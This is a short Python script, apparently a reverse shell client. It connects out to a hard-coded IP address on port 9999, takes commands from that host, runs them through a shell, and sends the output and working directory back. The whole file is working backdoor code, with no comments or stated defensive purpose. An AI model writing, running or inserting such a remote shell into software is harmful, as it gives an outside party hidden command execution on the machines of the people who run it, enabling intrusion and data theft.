import socket
import os
import subprocess


s = socket.socket()
host = "10.14.68.182"
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output_bytes = cmd.stdout.read()
        output_str = str(output_bytes,"utf-8")
        currentWD = os.getcwd()
        s.send(str.encode(output_str + currentWD))

        print(output_str)


